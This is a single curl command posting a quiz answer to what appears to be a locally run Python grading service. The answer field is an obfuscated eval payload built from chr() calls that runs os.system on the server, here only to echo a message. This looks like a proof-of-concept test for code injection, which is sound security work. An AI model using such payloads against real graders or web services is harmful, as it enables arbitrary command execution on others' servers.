curl -H "Content-Type: application/json" -X POST -d '{
	"question": "Zadej velke cislo.",
	"user": "nankaond",
	"tests": [{
		"answer": "eval(eval(chr(39)+chr(95)+chr(95)+chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(95)+chr(95)+chr(40)+chr(34)+chr(111)+chr(115)+chr(34)+chr(41)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(34)+chr(101)+chr(99)+chr(104)+chr(111)+chr(32)+chr(104)+chr(101)+chr(108)+chr(108)+chr(111)+chr(44)+chr(32)+chr(73)+chr(32)+chr(97)+chr(109)+chr(32)+chr(97)+chr(32)+chr(99)+chr(111)+chr(109)+chr(109)+chr(97)+chr(110)+chr(100)+chr(32)+chr(101)+chr(120)+chr(101)+chr(99)+chr(117)+chr(116)+chr(105)+chr(111)+chr(110)+chr(34)+chr(41)+chr(39)))",
		"initialization": "",
		"expression": "answer == 0",
		"hint_false": "takhle ne",
		"hint_true": "to by slo",
		"required": true,
		"tester": "python"
	}]
}' http://0.0.0.0:5000/test
